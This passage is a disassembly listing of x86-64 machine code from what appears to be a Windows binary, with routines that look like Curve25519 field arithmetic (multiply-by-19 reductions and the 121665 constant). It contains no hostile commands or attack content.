   140003792:	48 01 45 18          	add    %rax,0x18(%rbp)
   140003796:	48 6b 45 60 13       	imul   $0x13,0x60(%rbp),%rax
   14000379b:	48 01 45 10          	add    %rax,0x10(%rbp)
   14000379f:	48 6b 45 58 13       	imul   $0x13,0x58(%rbp),%rax
   1400037a4:	48 01 45 08          	add    %rax,0x8(%rbp)
   1400037a8:	48 6b 45 50 13       	imul   $0x13,0x50(%rbp),%rax
   1400037ad:	48 01 45 00          	add    %rax,0x0(%rbp)
   1400037b1:	48 6b 45 48 13       	imul   $0x13,0x48(%rbp),%rax
   1400037b6:	48 01 45 f8          	add    %rax,-0x8(%rbp)
   1400037ba:	48 6b 45 40 13       	imul   $0x13,0x40(%rbp),%rax
   1400037bf:	48 01 45 f0          	add    %rax,-0x10(%rbp)
   1400037c3:	48 6b 45 38 13       	imul   $0x13,0x38(%rbp),%rax
   1400037c8:	48 01 45 e8          	add    %rax,-0x18(%rbp)
   1400037cc:	48 6b 45 30 13       	imul   $0x13,0x30(%rbp),%rax
   1400037d1:	48 89 5d 30          	mov    %rbx,0x30(%rbp)
   1400037d5:	48 01 45 e0          	add    %rax,-0x20(%rbp)
   1400037d9:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   1400037e0:	49 8b 50 f0          	mov    -0x10(%r8),%rdx
   1400037e4:	4d 8d 40 10          	lea    0x10(%r8),%r8
   1400037e8:	48 8b ca             	mov    %rdx,%rcx
   1400037eb:	48 c1 e9 20          	shr    $0x20,%rcx
   1400037ef:	c1 f9 1f             	sar    $0x1f,%ecx
   1400037f2:	48 c1 e9 06          	shr    $0x6,%rcx
   1400037f6:	48 03 ca             	add    %rdx,%rcx
   1400037f9:	48 c1 f9 1a          	sar    $0x1a,%rcx
   1400037fd:	48 8b c1             	mov    %rcx,%rax
   140003800:	48 c1 e0 1a          	shl    $0x1a,%rax
   140003804:	48 2b d0             	sub    %rax,%rdx
   140003807:	49 89 50 e0          	mov    %rdx,-0x20(%r8)
   14000380b:	49 8b 50 e8          	mov    -0x18(%r8),%rdx
   14000380f:	48 03 d1             	add    %rcx,%rdx
   140003812:	48 8b ca             	mov    %rdx,%rcx
   140003815:	48 c1 e9 20          	shr    $0x20,%rcx
   140003819:	c1 f9 1f             	sar    $0x1f,%ecx
   14000381c:	48 c1 e9 07          	shr    $0x7,%rcx
   140003820:	48 03 ca             	add    %rdx,%rcx
   140003823:	48 c1 f9 19          	sar    $0x19,%rcx
   140003827:	49 01 48 f0          	add    %rcx,-0x10(%r8)
   14000382b:	48 8b c1             	mov    %rcx,%rax
   14000382e:	48 c1 e0 19          	shl    $0x19,%rax
   140003832:	48 2b d0             	sub    %rax,%rdx
   140003835:	49 89 50 e8          	mov    %rdx,-0x18(%r8)
   140003839:	49 83 e9 01          	sub    $0x1,%r9
   14000383d:	75 a1                	jne    0x1400037e0
   14000383f:	48 6b 55 30 13       	imul   $0x13,0x30(%rbp),%rdx
   140003844:	48 89 5d 30          	mov    %rbx,0x30(%rbp)
   140003848:	4c 8d 44 24 50       	lea    0x50(%rsp),%r8
   14000384d:	48 03 55 e0          	add    -0x20(%rbp),%rdx
   140003851:	4c 8b ce             	mov    %rsi,%r9
   140003854:	48 8b ca             	mov    %rdx,%rcx
   140003857:	48 c1 e9 20          	shr    $0x20,%rcx
   14000385b:	c1 f9 1f             	sar    $0x1f,%ecx
   14000385e:	48 c1 e9 06          	shr    $0x6,%rcx
   140003862:	48 03 ca             	add    %rdx,%rcx
   140003865:	48 c1 f9 1a          	sar    $0x1a,%rcx
   140003869:	48 01 4d e8          	add    %rcx,-0x18(%rbp)
   14000386d:	48 8b c1             	mov    %rcx,%rax
   140003870:	48 c1 e0 1a          	shl    $0x1a,%rax
   140003874:	48 2b d0             	sub    %rax,%rdx
   140003877:	48 6b 45 d0 13       	imul   $0x13,-0x30(%rbp),%rax
   14000387c:	48 89 55 e0          	mov    %rdx,-0x20(%rbp)
   140003880:	48 01 45 80          	add    %rax,-0x80(%rbp)
   140003884:	48 6b 45 c8 13       	imul   $0x13,-0x38(%rbp),%rax
   140003889:	48 01 44 24 78       	add    %rax,0x78(%rsp)
   14000388e:	48 6b 45 c0 13       	imul   $0x13,-0x40(%rbp),%rax
   140003893:	48 01 44 24 70       	add    %rax,0x70(%rsp)
   140003898:	48 6b 45 b8 13       	imul   $0x13,-0x48(%rbp),%rax
   14000389d:	48 01 44 24 68       	add    %rax,0x68(%rsp)
   1400038a2:	48 6b 45 b0 13       	imul   $0x13,-0x50(%rbp),%rax
   1400038a7:	48 01 44 24 60       	add    %rax,0x60(%rsp)
   1400038ac:	48 6b 45 a8 13       	imul   $0x13,-0x58(%rbp),%rax
   1400038b1:	48 01 44 24 58       	add    %rax,0x58(%rsp)
   1400038b6:	48 6b 45 a0 13       	imul   $0x13,-0x60(%rbp),%rax
   1400038bb:	48 01 44 24 50       	add    %rax,0x50(%rsp)
   1400038c0:	48 6b 45 98 13       	imul   $0x13,-0x68(%rbp),%rax
   1400038c5:	48 01 44 24 48       	add    %rax,0x48(%rsp)
   1400038ca:	48 6b 45 90 13       	imul   $0x13,-0x70(%rbp),%rax
   1400038cf:	48 89 5d 90          	mov    %rbx,-0x70(%rbp)
   1400038d3:	48 01 44 24 40       	add    %rax,0x40(%rsp)
   1400038d8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   1400038df:	00 
   1400038e0:	49 8b 50 f0          	mov    -0x10(%r8),%rdx
   1400038e4:	4d 8d 40 10          	lea    0x10(%r8),%r8
   1400038e8:	48 8b ca             	mov    %rdx,%rcx
   1400038eb:	48 c1 e9 20          	shr    $0x20,%rcx
   1400038ef:	c1 f9 1f             	sar    $0x1f,%ecx
   1400038f2:	48 c1 e9 06          	shr    $0x6,%rcx
   1400038f6:	48 03 ca             	add    %rdx,%rcx
   1400038f9:	48 c1 f9 1a          	sar    $0x1a,%rcx
   1400038fd:	48 8b c1             	mov    %rcx,%rax
   140003900:	48 c1 e0 1a          	shl    $0x1a,%rax
   140003904:	48 2b d0             	sub    %rax,%rdx
   140003907:	49 89 50 e0          	mov    %rdx,-0x20(%r8)
   14000390b:	49 8b 50 e8          	mov    -0x18(%r8),%rdx
   14000390f:	48 03 d1             	add    %rcx,%rdx
   140003912:	48 8b ca             	mov    %rdx,%rcx
   140003915:	48 c1 e9 20          	shr    $0x20,%rcx
   140003919:	c1 f9 1f             	sar    $0x1f,%ecx
   14000391c:	48 c1 e9 07          	shr    $0x7,%rcx
   140003920:	48 03 ca             	add    %rdx,%rcx
   140003923:	48 c1 f9 19          	sar    $0x19,%rcx
   140003927:	49 01 48 f0          	add    %rcx,-0x10(%r8)
   14000392b:	48 8b c1             	mov    %rcx,%rax
   14000392e:	48 c1 e0 19          	shl    $0x19,%rax
   140003932:	48 2b d0             	sub    %rax,%rdx
   140003935:	49 89 50 e8          	mov    %rdx,-0x18(%r8)
   140003939:	49 83 e9 01          	sub    $0x1,%r9
   14000393d:	75 a1                	jne    0x1400038e0
   14000393f:	48 6b 55 90 13       	imul   $0x13,-0x70(%rbp),%rdx
   140003944:	48 89 5d 90          	mov    %rbx,-0x70(%rbp)
   140003948:	48 03 54 24 40       	add    0x40(%rsp),%rdx
   14000394d:	48 8b ca             	mov    %rdx,%rcx
   140003950:	48 c1 e9 20          	shr    $0x20,%rcx
   140003954:	c1 f9 1f             	sar    $0x1f,%ecx
   140003957:	48 c1 e9 06          	shr    $0x6,%rcx
   14000395b:	48 03 ca             	add    %rdx,%rcx
   14000395e:	48 c1 f9 1a          	sar    $0x1a,%rcx
   140003962:	48 8b c1             	mov    %rcx,%rax
   140003965:	48 c1 e0 1a          	shl    $0x1a,%rax
   140003969:	48 2b d0             	sub    %rax,%rdx
   14000396c:	48 01 4c 24 48       	add    %rcx,0x48(%rsp)
   140003971:	48 89 54 24 40       	mov    %rdx,0x40(%rsp)
   140003976:	89 5c 24 20          	mov    %ebx,0x20(%rsp)
   14000397a:	8b 44 24 20          	mov    0x20(%rsp),%eax
   14000397e:	66 90                	xchg   %ax,%ax
   140003980:	48 63 44 24 20       	movslq 0x20(%rsp),%rax
   140003985:	48 8d 55 e0          	lea    -0x20(%rbp),%rdx
   140003989:	48 63 4c 24 20       	movslq 0x20(%rsp),%rcx
   14000398e:	0f b6 04 02          	movzbl (%rdx,%rax,1),%eax
   140003992:	88 84 0d 80 00 00 00 	mov    %al,0x80(%rbp,%rcx,1)
   140003999:	8b 44 24 20          	mov    0x20(%rsp),%eax
   14000399d:	ff c0                	inc    %eax
   14000399f:	89 44 24 20          	mov    %eax,0x20(%rsp)
   1400039a3:	8b 44 24 20          	mov    0x20(%rsp),%eax
   1400039a7:	83 f8 50             	cmp    $0x50,%eax
   1400039aa:	72 d4                	jb     0x140003980
   1400039ac:	48 8b cb             	mov    %rbx,%rcx
   1400039af:	48 8b d6             	mov    %rsi,%rdx
   1400039b2:	0f 1f 40 00          	nopl   0x0(%rax)
   1400039b6:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   1400039bd:	00 00 00 
   1400039c0:	48 8b 44 0c 40       	mov    0x40(%rsp,%rcx,1),%rax
   1400039c5:	48 01 44 0d e0       	add    %rax,-0x20(%rbp,%rcx,1)
   1400039ca:	48 8b 44 0c 48       	mov    0x48(%rsp,%rcx,1),%rax
   1400039cf:	48 01 44 0d e8       	add    %rax,-0x18(%rbp,%rcx,1)
   1400039d4:	48 8d 49 10          	lea    0x10(%rcx),%rcx
   1400039d8:	48 83 ea 01          	sub    $0x1,%rdx
   1400039dc:	75 e2                	jne    0x1400039c0
   1400039de:	f3 0f 6f 85 80 00 00 	movdqu 0x80(%rbp),%xmm0
   1400039e5:	00 
   1400039e6:	48 8d 55 e0          	lea    -0x20(%rbp),%rdx
   1400039ea:	66 0f fb 44 24 40    	psubq  0x40(%rsp),%xmm0
   1400039f0:	48 8d 8d 80 00 00 00 	lea    0x80(%rbp),%rcx
   1400039f7:	f3 0f 6f 8d 90 00 00 	movdqu 0x90(%rbp),%xmm1
   1400039fe:	00 
   1400039ff:	66 0f fb 4c 24 50    	psubq  0x50(%rsp),%xmm1
   140003a05:	f3 0f 7f 44 24 40    	movdqu %xmm0,0x40(%rsp)
   140003a0b:	f3 0f 6f 85 a0 00 00 	movdqu 0xa0(%rbp),%xmm0
   140003a12:	00 
   140003a13:	66 0f fb 44 24 60    	psubq  0x60(%rsp),%xmm0
   140003a19:	f3 0f 7f 44 24 60    	movdqu %xmm0,0x60(%rsp)
   140003a1f:	f3 0f 6f 85 c0 00 00 	movdqu 0xc0(%rbp),%xmm0
   140003a26:	00 
   140003a27:	66 0f fb 45 80       	psubq  -0x80(%rbp),%xmm0
   140003a2c:	f3 0f 7f 4c 24 50    	movdqu %xmm1,0x50(%rsp)
   140003a32:	f3 0f 6f 8d b0 00 00 	movdqu 0xb0(%rbp),%xmm1
   140003a39:	00 
   140003a3a:	66 0f fb 4c 24 70    	psubq  0x70(%rsp),%xmm1
   140003a40:	f3 0f 7f 45 80       	movdqu %xmm0,-0x80(%rbp)
   140003a45:	f3 0f 7f 4c 24 70    	movdqu %xmm1,0x70(%rsp)
   140003a4b:	e8 60 f2 ff ff       	call   0x140002cb0
   140003a50:	48 8d 54 24 40       	lea    0x40(%rsp),%rdx
   140003a55:	48 8d 8d 00 03 00 00 	lea    0x300(%rbp),%rcx
   140003a5c:	e8 4f f2 ff ff       	call   0x140002cb0
   140003a61:	4c 8b 44 24 28       	mov    0x28(%rsp),%r8
   140003a66:	48 8d 95 00 03 00 00 	lea    0x300(%rbp),%rdx
   140003a6d:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   140003a72:	e8 d9 e6 ff ff       	call   0x140002150
   140003a77:	48 6b 45 d0 13       	imul   $0x13,-0x30(%rbp),%rax
   140003a7c:	4c 8d 44 24 50       	lea    0x50(%rsp),%r8
   140003a81:	4c 8b ce             	mov    %rsi,%r9
   140003a84:	48 01 45 80          	add    %rax,-0x80(%rbp)
   140003a88:	48 6b 45 c8 13       	imul   $0x13,-0x38(%rbp),%rax
   140003a8d:	48 01 44 24 78       	add    %rax,0x78(%rsp)
   140003a92:	48 6b 45 c0 13       	imul   $0x13,-0x40(%rbp),%rax
   140003a97:	48 01 44 24 70       	add    %rax,0x70(%rsp)
   140003a9c:	48 6b 45 b8 13       	imul   $0x13,-0x48(%rbp),%rax
   140003aa1:	48 01 44 24 68       	add    %rax,0x68(%rsp)
   140003aa6:	48 6b 45 b0 13       	imul   $0x13,-0x50(%rbp),%rax
   140003aab:	48 01 44 24 60       	add    %rax,0x60(%rsp)
   140003ab0:	48 6b 45 a8 13       	imul   $0x13,-0x58(%rbp),%rax
   140003ab5:	48 01 44 24 58       	add    %rax,0x58(%rsp)
   140003aba:	48 6b 45 a0 13       	imul   $0x13,-0x60(%rbp),%rax
   140003abf:	48 01 44 24 50       	add    %rax,0x50(%rsp)
   140003ac4:	48 6b 45 98 13       	imul   $0x13,-0x68(%rbp),%rax
   140003ac9:	48 01 44 24 48       	add    %rax,0x48(%rsp)
   140003ace:	48 6b 45 90 13       	imul   $0x13,-0x70(%rbp),%rax
   140003ad3:	48 89 5d 90          	mov    %rbx,-0x70(%rbp)
   140003ad7:	48 01 44 24 40       	add    %rax,0x40(%rsp)
   140003adc:	0f 1f 40 00          	nopl   0x0(%rax)
   140003ae0:	49 8b 50 f0          	mov    -0x10(%r8),%rdx
   140003ae4:	4d 8d 40 10          	lea    0x10(%r8),%r8
   140003ae8:	48 8b ca             	mov    %rdx,%rcx
   140003aeb:	48 c1 e9 20          	shr    $0x20,%rcx
   140003aef:	c1 f9 1f             	sar    $0x1f,%ecx
   140003af2:	48 c1 e9 06          	shr    $0x6,%rcx
   140003af6:	48 03 ca             	add    %rdx,%rcx
   140003af9:	48 c1 f9 1a          	sar    $0x1a,%rcx
   140003afd:	48 8b c1             	mov    %rcx,%rax
   140003b00:	48 c1 e0 1a          	shl    $0x1a,%rax
   140003b04:	48 2b d0             	sub    %rax,%rdx
   140003b07:	49 89 50 e0          	mov    %rdx,-0x20(%r8)
   140003b0b:	49 8b 50 e8          	mov    -0x18(%r8),%rdx
   140003b0f:	48 03 d1             	add    %rcx,%rdx
   140003b12:	48 8b ca             	mov    %rdx,%rcx
   140003b15:	48 c1 e9 20          	shr    $0x20,%rcx
   140003b19:	c1 f9 1f             	sar    $0x1f,%ecx
   140003b1c:	48 c1 e9 07          	shr    $0x7,%rcx
   140003b20:	48 03 ca             	add    %rdx,%rcx
   140003b23:	48 c1 f9 19          	sar    $0x19,%rcx
   140003b27:	49 01 48 f0          	add    %rcx,-0x10(%r8)
   140003b2b:	48 8b c1             	mov    %rcx,%rax
   140003b2e:	48 c1 e0 19          	shl    $0x19,%rax
   140003b32:	48 2b d0             	sub    %rax,%rdx
   140003b35:	49 89 50 e8          	mov    %rdx,-0x18(%r8)
   140003b39:	49 83 e9 01          	sub    $0x1,%r9
   140003b3d:	75 a1                	jne    0x140003ae0
   140003b3f:	48 6b 55 90 13       	imul   $0x13,-0x70(%rbp),%rdx
   140003b44:	48 89 5d 90          	mov    %rbx,-0x70(%rbp)
   140003b48:	48 03 54 24 40       	add    0x40(%rsp),%rdx
   140003b4d:	48 8b ca             	mov    %rdx,%rcx
   140003b50:	48 c1 e9 20          	shr    $0x20,%rcx
   140003b54:	c1 f9 1f             	sar    $0x1f,%ecx
   140003b57:	48 c1 e9 06          	shr    $0x6,%rcx
   140003b5b:	48 03 ca             	add    %rdx,%rcx
   140003b5e:	48 c1 f9 1a          	sar    $0x1a,%rcx
   140003b62:	48 8b c1             	mov    %rcx,%rax
   140003b65:	48 c1 e0 1a          	shl    $0x1a,%rax
   140003b69:	48 2b d0             	sub    %rax,%rdx
   140003b6c:	48 01 4c 24 48       	add    %rcx,0x48(%rsp)
   140003b71:	48 89 54 24 40       	mov    %rdx,0x40(%rsp)
   140003b76:	89 5c 24 20          	mov    %ebx,0x20(%rsp)
   140003b7a:	8b 44 24 20          	mov    0x20(%rsp),%eax
   140003b7e:	66 90                	xchg   %ax,%ax
   140003b80:	48 63 44 24 20       	movslq 0x20(%rsp),%rax
   140003b85:	48 8d 95 80 00 00 00 	lea    0x80(%rbp),%rdx
   140003b8c:	48 63 4c 24 20       	movslq 0x20(%rsp),%rcx
   140003b91:	0f b6 04 02          	movzbl (%rdx,%rax,1),%eax
   140003b95:	42 88 04 21          	mov    %al,(%rcx,%r12,1)
   140003b99:	8b 44 24 20          	mov    0x20(%rsp),%eax
   140003b9d:	ff c0                	inc    %eax
   140003b9f:	89 44 24 20          	mov    %eax,0x20(%rsp)
   140003ba3:	8b 44 24 20          	mov    0x20(%rsp),%eax
   140003ba7:	83 f8 50             	cmp    $0x50,%eax
   140003baa:	72 d4                	jb     0x140003b80
   140003bac:	48 8b 54 24 30       	mov    0x30(%rsp),%rdx
   140003bb1:	89 5c 24 20          	mov    %ebx,0x20(%rsp)
   140003bb5:	8b 44 24 20          	mov    0x20(%rsp),%eax
   140003bb9:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140003bc0:	48 63 44 24 20       	movslq 0x20(%rsp),%rax
   140003bc5:	4c 8d 44 24 40       	lea    0x40(%rsp),%r8
   140003bca:	48 63 4c 24 20       	movslq 0x20(%rsp),%rcx
   140003bcf:	41 0f b6 04 00       	movzbl (%r8,%rax,1),%eax
   140003bd4:	88 04 11             	mov    %al,(%rcx,%rdx,1)
   140003bd7:	8b 44 24 20          	mov    0x20(%rsp),%eax
   140003bdb:	ff c0                	inc    %eax
   140003bdd:	89 44 24 20          	mov    %eax,0x20(%rsp)
   140003be1:	8b 44 24 20          	mov    0x20(%rsp),%eax
   140003be5:	83 f8 50             	cmp    $0x50,%eax
   140003be8:	72 d6                	jb     0x140003bc0
   140003bea:	49 8b d5             	mov    %r13,%rdx
   140003bed:	48 8d 8d 60 02 00 00 	lea    0x260(%rbp),%rcx
   140003bf4:	e8 b7 f0 ff ff       	call   0x140002cb0
   140003bf9:	49 8b d6             	mov    %r14,%rdx
   140003bfc:	48 8d 8d c0 01 00 00 	lea    0x1c0(%rbp),%rcx
   140003c03:	e8 a8 f0 ff ff       	call   0x140002cb0
   140003c08:	4c 8b 74 24 38       	mov    0x38(%rsp),%r14
   140003c0d:	4c 8d 85 c0 01 00 00 	lea    0x1c0(%rbp),%r8
   140003c14:	49 8b ce             	mov    %r14,%rcx
   140003c17:	48 8d 95 60 02 00 00 	lea    0x260(%rbp),%rdx
   140003c1e:	e8 2d e5 ff ff       	call   0x140002150
   140003c23:	49 6b 86 90 00 00 00 	imul   $0x13,0x90(%r14),%rax
   140003c2a:	13 
   140003c2b:	49 8b ce             	mov    %r14,%rcx
   140003c2e:	49 01 46 40          	add    %rax,0x40(%r14)
   140003c32:	49 6b 86 88 00 00 00 	imul   $0x13,0x88(%r14),%rax
   140003c39:	13 
   140003c3a:	49 01 46 38          	add    %rax,0x38(%r14)
   140003c3e:	49 6b 86 80 00 00 00 	imul   $0x13,0x80(%r14),%rax
   140003c45:	13 
   140003c46:	49 01 46 30          	add    %rax,0x30(%r14)
   140003c4a:	49 6b 46 78 13       	imul   $0x13,0x78(%r14),%rax
   140003c4f:	49 01 46 28          	add    %rax,0x28(%r14)
   140003c53:	49 6b 46 70 13       	imul   $0x13,0x70(%r14),%rax
   140003c58:	49 01 46 20          	add    %rax,0x20(%r14)
   140003c5c:	49 6b 46 68 13       	imul   $0x13,0x68(%r14),%rax
   140003c61:	49 01 46 18          	add    %rax,0x18(%r14)
   140003c65:	49 6b 46 60 13       	imul   $0x13,0x60(%r14),%rax
   140003c6a:	49 01 46 10          	add    %rax,0x10(%r14)
   140003c6e:	49 6b 46 58 13       	imul   $0x13,0x58(%r14),%rax
   140003c73:	49 01 46 08          	add    %rax,0x8(%r14)
   140003c77:	49 6b 46 50 13       	imul   $0x13,0x50(%r14),%rax
   140003c7c:	49 01 06             	add    %rax,(%r14)
   140003c7f:	e8 dc ea ff ff       	call   0x140002760
   140003c84:	f3 0f 6f 85 60 02 00 	movdqu 0x260(%rbp),%xmm0
   140003c8b:	00 
   140003c8c:	66 0f fb 85 c0 01 00 	psubq  0x1c0(%rbp),%xmm0
   140003c93:	00 
   140003c94:	f3 0f 6f 8d 70 02 00 	movdqu 0x270(%rbp),%xmm1
   140003c9b:	00 
   140003c9c:	66 0f fb 8d d0 01 00 	psubq  0x1d0(%rbp),%xmm1
   140003ca3:	00 
   140003ca4:	f3 0f 7f 85 c0 01 00 	movdqu %xmm0,0x1c0(%rbp)
   140003cab:	00 
   140003cac:	f3 0f 6f 85 80 02 00 	movdqu 0x280(%rbp),%xmm0
   140003cb3:	00 
   140003cb4:	66 0f fb 85 e0 01 00 	psubq  0x1e0(%rbp),%xmm0
   140003cbb:	00 
   140003cbc:	f3 0f 7f 85 e0 01 00 	movdqu %xmm0,0x1e0(%rbp)
   140003cc3:	00 
   140003cc4:	f3 0f 6f 85 a0 02 00 	movdqu 0x2a0(%rbp),%xmm0
   140003ccb:	00 
   140003ccc:	66 0f fb 85 00 02 00 	psubq  0x200(%rbp),%xmm0
   140003cd3:	00 
   140003cd4:	f3 0f 7f 8d d0 01 00 	movdqu %xmm1,0x1d0(%rbp)
   140003cdb:	00 
   140003cdc:	f3 0f 6f 8d 90 02 00 	movdqu 0x290(%rbp),%xmm1
   140003ce3:	00 
   140003ce4:	66 0f fb 8d f0 01 00 	psubq  0x1f0(%rbp),%xmm1
   140003ceb:	00 
   140003cec:	f3 0f 7f 85 00 02 00 	movdqu %xmm0,0x200(%rbp)
   140003cf3:	00 
   140003cf4:	f3 0f 7f 8d f0 01 00 	movdqu %xmm1,0x1f0(%rbp)
   140003cfb:	00 
   140003cfc:	89 5c 24 20          	mov    %ebx,0x20(%rsp)
   140003d00:	8b 44 24 20          	mov    0x20(%rsp),%eax
   140003d04:	0f 1f 40 00          	nopl   0x0(%rax)
   140003d08:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   140003d0f:	00 
   140003d10:	48 63 44 24 20       	movslq 0x20(%rsp),%rax
   140003d15:	88 9c 05 70 01 00 00 	mov    %bl,0x170(%rbp,%rax,1)
   140003d1c:	8b 44 24 20          	mov    0x20(%rsp),%eax
   140003d20:	ff c0                	inc    %eax
   140003d22:	89 44 24 20          	mov    %eax,0x20(%rsp)
   140003d26:	8b 44 24 20          	mov    0x20(%rsp),%eax
   140003d2a:	83 f8 48             	cmp    $0x48,%eax
   140003d2d:	72 e1                	jb     0x140003d10
   140003d2f:	83 3d 42 73 00 00 06 	cmpl   $0x6,0x7342(%rip)        # 0x14000b078
   140003d36:	7c 78                	jl     0x140003db0
   140003d38:	66 0f 6f 1d 00 df ff 	movdqa -0x2100(%rip),%xmm3        # 0x140001c40
   140003d3f:	ff 
   140003d40:	f3 0f 6f 85 c0 01 00 	movdqu 0x1c0(%rbp),%xmm0
   140003d47:	00 
   140003d48:	f3 0f 6f 95 d0 01 00 	movdqu 0x1d0(%rbp),%xmm2
   140003d4f:	00 
   140003d50:	62 f2 fd 08 40 cb    	vpmullq %xmm3,%xmm0,%xmm1
   140003d56:	62 f2 ed 08 40 c3    	vpmullq %xmm3,%xmm2,%xmm0
   140003d5c:	f3 0f 7f 8d 20 01 00 	movdqu %xmm1,0x120(%rbp)
   140003d63:	00 
   140003d64:	f3 0f 6f 8d e0 01 00 	movdqu 0x1e0(%rbp),%xmm1
   140003d6b:	00 
   140003d6c:	62 f2 f5 08 40 d3    	vpmullq %xmm3,%xmm1,%xmm2
   140003d72:	f3 0f 7f 85 30 01 00 	movdqu %xmm0,0x130(%rbp)
   140003d79:	00 
   140003d7a:	f3 0f 6f 85 f0 01 00 	movdqu 0x1f0(%rbp),%xmm0
   140003d81:	00 
   140003d82:	62 f2 fd 08 40 cb    	vpmullq %xmm3,%xmm0,%xmm1
   140003d88:	f3 0f 7f 95 40 01 00 	movdqu %xmm2,0x140(%rbp)
   140003d8f:	00 
   140003d90:	f3 0f 6f 95 00 02 00 	movdqu 0x200(%rbp),%xmm2
   140003d97:	00 
   140003d98:	62 f2 ed 08 40 c3    	vpmullq %xmm3,%xmm2,%xmm0
   140003d9e:	f3 0f 7f 85 60 01 00 	movdqu %xmm0,0x160(%rbp)
   140003da5:	00 
   140003da6:	f3 0f 7f 8d 50 01 00 	movdqu %xmm1,0x150(%rbp)
   140003dad:	00 
   140003dae:	eb 2e                	jmp    0x140003dde
   140003db0:	48 8b cb             	mov    %rbx,%rcx
   140003db3:	ba 0a 00 00 00       	mov    $0xa,%edx
   140003db8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   140003dbf:	00 
   140003dc0:	48 69 84 0d c0 01 00 	imul   $0x1db41,0x1c0(%rbp,%rcx,1),%rax
   140003dc7:	00 41 db 01 00 
   140003dcc:	48 89 84 0d 20 01 00 	mov    %rax,0x120(%rbp,%rcx,1)
   140003dd3:	00 
   140003dd4:	48 8d 49 08          	lea    0x8(%rcx),%rcx
   140003dd8:	48 83 ea 01          	sub    $0x1,%rdx
   140003ddc:	75 e2                	jne    0x140003dc0
   140003dde:	48 89 9d 70 01 00 00 	mov    %rbx,0x170(%rbp)
   140003de5:	4c 8d 85 30 01 00 00 	lea    0x130(%rbp),%r8
   140003dec:	4c 8b ce             	mov    %rsi,%r9
   140003def:	90                   	nop
   140003df0:	49 8b 50 f0          	mov    -0x10(%r8),%rdx
   140003df4:	4d 8d 40 10          	lea    0x10(%r8),%r8
   140003df8:	48 8b ca             	mov    %rdx,%rcx
   140003dfb:	48 c1 e9 20          	shr    $0x20,%rcx
   140003dff:	c1 f9 1f             	sar    $0x1f,%ecx
   140003e02:	48 c1 e9 06          	shr    $0x6,%rcx
   140003e06:	48 03 ca             	add    %rdx,%rcx
   140003e09:	48 c1 f9 1a          	sar    $0x1a,%rcx
   140003e0d:	48 8b c1             	mov    %rcx,%rax
   140003e10:	48 c1 e0 1a          	shl    $0x1a,%rax
   140003e14:	48 2b d0             	sub    %rax,%rdx
   140003e17:	49 89 50 e0          	mov    %rdx,-0x20(%r8)
   140003e1b:	49 8b 50 e8          	mov    -0x18(%r8),%rdx
   140003e1f:	48 03 d1             	add    %rcx,%rdx
   140003e22:	48 8b ca             	mov    %rdx,%rcx
   140003e25:	48 c1 e9 20          	shr    $0x20,%rcx
   140003e29:	c1 f9 1f             	sar    $0x1f,%ecx
   140003e2c:	48 c1 e9 07          	shr    $0x7,%rcx
   140003e30:	48 03 ca             	add    %rdx,%rcx
   140003e33:	48 c1 f9 19          	sar    $0x19,%rcx
   140003e37:	49 01 48 f0          	add    %rcx,-0x10(%r8)
   140003e3b:	48 8b c1             	mov    %rcx,%rax
   140003e3e:	48 c1 e0 19          	shl    $0x19,%rax
   140003e42:	48 2b d0             	sub    %rax,%rdx
   140003e45:	49 89 50 e8          	mov    %rdx,-0x18(%r8)
   140003e49:	49 83 e9 01          	sub    $0x1,%r9
   140003e4d:	75 a1                	jne    0x140003df0
   140003e4f:	48 6b 95 70 01 00 00 	imul   $0x13,0x170(%rbp),%rdx
   140003e56:	13 
   140003e57:	48 89 9d 70 01 00 00 	mov    %rbx,0x170(%rbp)
   140003e5e:	48 03 95 20 01 00 00 	add    0x120(%rbp),%rdx
   140003e65:	48 8b ca             	mov    %rdx,%rcx
   140003e68:	48 c1 e9 20          	shr    $0x20,%rcx
   140003e6c:	c1 f9 1f             	sar    $0x1f,%ecx
   140003e6f:	48 c1 e9 06          	shr    $0x6,%rcx
   140003e73:	48 03 ca             	add    %rdx,%rcx
   140003e76:	48 c1 f9 1a          	sar    $0x1a,%rcx
   140003e7a:	48 8b c1             	mov    %rcx,%rax
   140003e7d:	48 c1 e0 1a          	shl    $0x1a,%rax
   140003e81:	48 2b d0             	sub    %rax,%rdx
   140003e84:	48 01 8d 28 01 00 00 	add    %rcx,0x128(%rbp)
   140003e8b:	48 89 95 20 01 00 00 	mov    %rdx,0x120(%rbp)
   140003e92:	0f 1f 40 00          	nopl   0x0(%rax)
   140003e96:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   140003e9d:	00 00 00 
   140003ea0:	48 8b 84 1d 60 02 00 	mov    0x260(%rbp,%rbx,1),%rax
   140003ea7:	00 
   140003ea8:	48 01 84 1d 20 01 00 	add    %rax,0x120(%rbp,%rbx,1)
   140003eaf:	00 
   140003eb0:	48 8b 84 1d 68 02 00 	mov    0x268(%rbp,%rbx,1),%rax
   140003eb7:	00 
   140003eb8:	48 01 84 1d 28 01 00 	add    %rax,0x128(%rbp,%rbx,1)
   140003ebf:	00 
   140003ec0:	48 8d 5b 10          	lea    0x10(%rbx),%rbx
   140003ec4:	48 83 ee 01          	sub    $0x1,%rsi
   140003ec8:	75 d6                	jne    0x140003ea0
   140003eca:	4c 8d 85 20 01 00 00 	lea    0x120(%rbp),%r8
   140003ed1:	48 8b cf             	mov    %rdi,%rcx
   140003ed4:	48 8d 95 c0 01 00 00 	lea    0x1c0(%rbp),%rdx
   140003edb:	e8 70 e2 ff ff       	call   0x140002150
   140003ee0:	48 6b 87 90 00 00 00 	imul   $0x13,0x90(%rdi),%rax
   140003ee7:	13 
   140003ee8:	48 8b cf             	mov    %rdi,%rcx
   140003eeb:	48 01 47 40          	add    %rax,0x40(%rdi)
   140003eef:	48 6b 87 88 00 00 00 	imul   $0x13,0x88(%rdi),%rax
   140003ef6:	13 
   140003ef7:	48 01 47 38          	add    %rax,0x38(%rdi)
   140003efb:	48 6b 87 80 00 00 00 	imul   $0x13,0x80(%rdi),%rax
   140003f02:	13 
   140003f03:	48 01 47 30          	add    %rax,0x30(%rdi)
   140003f07:	48 6b 47 78 13       	imul   $0x13,0x78(%rdi),%rax
